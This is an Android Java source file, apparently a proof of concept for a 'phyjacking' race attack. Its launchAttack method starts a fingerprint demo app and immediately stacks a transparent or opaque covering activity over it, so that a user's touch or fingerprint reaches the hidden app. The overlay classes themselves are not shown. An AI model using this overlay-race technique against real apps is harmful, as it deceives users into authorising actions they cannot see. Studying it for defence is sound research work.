package poc.phyjacking.raceattack;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.CompoundButton;
import android.widget.Switch;


public class MainActivity extends Activity{

	private boolean isTrans = true;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.home);

		final Button btn = findViewById(R.id.button);
		btn.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				launchAttack();
			}
		});

		final Switch transSwitch = findViewById(R.id.transSwitch);
		transSwitch.setChecked(isTrans);
		transSwitch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
			@Override
			public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
				isTrans = isChecked;
			}
		});
	}

	public void launchAttack() {
		String testPkgName = "xb.fingerprint.demo";
		final Intent victimIntent = getPackageManager().getLaunchIntentForPackage(testPkgName);
		final Intent coverIntent;

		victimIntent.setFlags(
			Intent.FLAG_ACTIVITY_NO_ANIMATION
			| Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK
		);

		if (isTrans) {
			coverIntent = new Intent(MainActivity.this, CoveringActivity.class);
		} else {
			coverIntent = new Intent(MainActivity.this, Covering2Activity.class);
		}
		coverIntent.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);

		startActivities(new Intent[]{victimIntent, coverIntent});
	}
}
